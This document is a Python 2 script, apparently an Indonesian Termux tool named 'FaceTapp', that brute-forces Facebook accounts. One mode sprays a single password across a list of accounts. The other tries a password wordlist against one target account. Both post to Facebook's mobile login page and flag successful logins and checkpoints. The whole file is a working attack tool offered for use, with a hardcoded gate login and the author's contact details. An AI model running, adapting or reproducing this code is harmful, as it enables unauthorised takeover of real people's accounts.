#!/usr/bin/python2

import requests
import time
import os
import sys

sleep = time.sleep
system = os.system
exit = sys.exit

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(2.0 / 90)
        
def lambat(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(0.2)
        
def main_3():
    sleep(2)
    system("clear")
    sleep(2)
    print ("""
        \033[1;32m______                     _____                      
        |  ___|                   |_   _|                     
        | |_     __ _   ___   ___   | |    __ _  _ __   _ __  
        |  _|   / _` | / __| / _ \  | |   / _` || '_ \ | '_ \ 
        | |    | (_| || (__ |  __/  | |  | (_| || |_) || |_) |
        \_|     \__,_| \___| \___|  \_/   \__,_|| .__/ | .__/ 
                                                | |    | |    
                    \033[1;33m( \033[1;32mFacebook Tapping \033[1;33m)        \033[1;32m|_|    |_| \033[1;37mV1.1
    """)
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m] Author >> \033[1;37mD@rk_Devil#666")
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m]   WA   >> \033[1;37m089652884613")
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m] Email  >> \033[1;37mDarkhytd666@gmail.com")
    print ("")
    link = 'https://free.facebook.com/login.php'
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m] CTRL + C Untuk Memberhentikan Proggram")
    slowprint("\033[1;33m[\033[1;37m+\033[1;33m] Kategori : \033[1;37mHack Fb Massal")
    print ("")
    word = input("\033[1;33m[\033[1;37m?\033[1;33m] Masukkan Wordlist : \033[1;37m")
    kah = input("\033[1;33m[\033[1;37m?\033[1;33m] Password : \033[1;37m")
    lambat("\033[1;33m[\033[1;37m√\033[1;33m] Memulai Mengcrack...")
    z = open(word, "r").readlines()
    for baris in z:
        pas = baris.strip()
        server = requests.post(link, data={'email':pas, 'pass':kah, 'login':'submit'})
        konten = server.content
        
        if "Beranda" in str(konten):
            print ("\033[1;33m[\033[1;37m√\033[1;33m] Berhasil : \033[1;37m%s" % pas, " \033[1;33m>> \033[1;37m%s" % kah)
            
        elif "checkpoint" in str(konten):
            print ("\033[1;33m[\033[1;37m!\033[1;33m] CheckPoint : \033[1;31m%s" % pas, " \033[1;33m>> \033[1;31m%s" % kah)
            
        else:
            print ("\033[1;33m[\033[1;37m!\033[1;33m] Gagal : \033[1;31m%s" % pas, " \033[1;33m>> \033[1;31m%s" % kah)
        
def main_2():
    sleep(2)
    system("clear")
    sleep(2)
    print ("""
        \033[1;32m ______                         _                           
        |  ____|                       | |                          
        | |__      __ _    ___    ___  | |_    __ _   _ __    _ __  
        |  __|    / _` |  / __|  / _ \ | __|  / _` | | '_ \  | '_ \ 
        | |      | (_| | | (__  |  __/ | |_  | (_| | | |_) | | |_) |
        |_|       \__,_|  \___|  \___|  \__|  \__,_| | .__/  | .__/ 
                                                     | |     | |    
                        \033[1;33m( \033[1;32mFacebook Tapping \033[1;33m)         \033[1;32m|_|     |_| \033[1;37mV1.1
                            
    """)
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m] Author >> \033[1;37mD@rk_Devil#666")
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m]   WA   >> \033[1;37m089652884613")
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m] Email >> \033[1;37mDarkhytd666")
    print ("")
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m] Menu : ")
    slowprint("\033[1;33m[\033[1;37m1\033[1;33m] FaceTapp Massal")
    slowprint("\033[1;33m[\033[1;37m2\033[1;33m] FaceTapp Target")
    slowprint("\033[1;33m[\033[1;37m0\033[1;33m] Exit")
    print ("")
    choose = input("\033[1;33m[\033[1;37m?\033[1;33m] Pilih : \033[1;37m")
    masal = '1'
    target = '2'
    keluar = '0'
    if choose == str('1'):
        main_3()
        
    elif choose == str('2'):
        main_1()
        
    elif choose == str('0'):
        exit(2)
        
    else:
        slowprint("\033[1;33m[\033[1;37m!\033[1;33m] Error : Wrong Input")
        main_2()
        
def main():
    sleep(2)
    system("clear")
    slowprint("\033[1;32mMasukkan Username dan Password")
    slowprint("\033[1;32mAtau hubungi Developer, bila")
    slowprint("\033[1;32mIngin mengetahui Username dan Password")
    slowprint("\033[1;32mNo Author : 089652884613")
    kata = 'Termux'
    kunci = 'FaceTapp'
    use1 = input("\033[1;33m[\033[1;37m?\033[1;33m] Username : \033[1;37m")
    if use1 == kata:
        kat1 = input("\033[1;33m[\033[1;37m?\033[1;33m] Password : \033[1;37m")
        if kat1 == kunci:
            lambat("\033[1;33m[\033[1;37m√\033[1;33m] Login Sukses")
            main_2()
            
        else:
            lambat("\033[1;33m[\033[1;37m!\033[1;33m] Login Gagal")
            sleep(2)
            system("clear")
            main()
            
    else:
        lambat("\033[1;33m[\033[1;37m!\033[1;33m] Login Gagal")
        sleep(2)
        system("clear")
        main()



def main_1():
    sleep(2)
    system("clear")
    system("xdg-open https://wa.me/6289652884613/?text=Aku%20mau%20kok%20Jadi%20Pacar%20Kamu%20")
    sleep(2)
    system("clear")
    sleep(2)
    namaku = input("\033[1;33m[\033[1;37m?\033[1;33m] Tuliskan Namamu : \033[1;37m")
    sleep(2)
    system("clear")
    sleep(2)
    print ("""
                                                           
     \033[1;32m/**/////                             /**             ****** 
    /**        ******    *****   *****  ******  ******  /**///**
    /*******  //////**  **///** **///**///**/  //////** /**  /**
    /**////    ******* /**  // /*******  /**    ******* /****** 
    /**       **////** /**   **/**////   /**   **////** /**///  
    /**      //********//***** //******  //** //********/**     
    //        ////////  /////   //////    //   //////// //  \033[1;37mV1.1
    
                     \033[1;33m( \033[1;32mFacebook Tapping \033[1;33m)

     \033[1;33mAuthor > \033[1;37mD@rk_Devil#666
       \033[1;33mWA   > \033[1;37m089652884613
      \033[1;33mEmail > \033[1;37mDarkhytd666@gmail.com
     \033[1;32mCopyright © 2019 \033[1;37mFarrel
    """)
    sleep(0.3)
    print ("")
    slowprint("\033[1;33m[\033[1;37m√\033[1;33m] \033[1;33mSelamat Datang \033[1;37m%s" % namaku)
    sleep(0.3)
    slowprint("\033[1;33m[\033[1;37m+\033[1;33m] Kategori : \033[1;37mHack Fb Target")
    sleep(0.3)
    slowprint("\033[1;33m[\033[1;37m!\033[1;33m] CTRL + C Memberhentikan Proggram")
    sleep(0.3)
    print ("")
    url = 'https://free.facebook.com/login.php'
    email = input("\033[1;33m[\033[1;37m?\033[1;33m] \033[1;32mMasukkan |ID| |Email| |No| : \033[1;37m")
    pw = input("\033[1;33m[\033[1;37m?\033[1;33m] \033[1;32mPassword LIST : \033[1;37m")
    sleep(2)
    lambat("\033[1;33m[\033[1;37m√\033[1;33m] Memulai Mengcrack \033[1;37m%s" % email)
    
    x = open(pw, "r").readlines()
    
    for line in x:
        password = line.strip()
        
        http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
        content = http.content
        if "Beranda" in str(content):
            print ("\033[1;33m[\033[1;37m√\033[1;33m] \033[1;33mPassword ditemukan >> \033[1;37m%s" % password)
            exit(1)
            
        else:
            print ("\033[1;33m[\033[1;37m!\033[1;33m] \033[1;33mGagal >> \033[1;31m%s" % password)
            
if __name__ == "__main__":
    main()
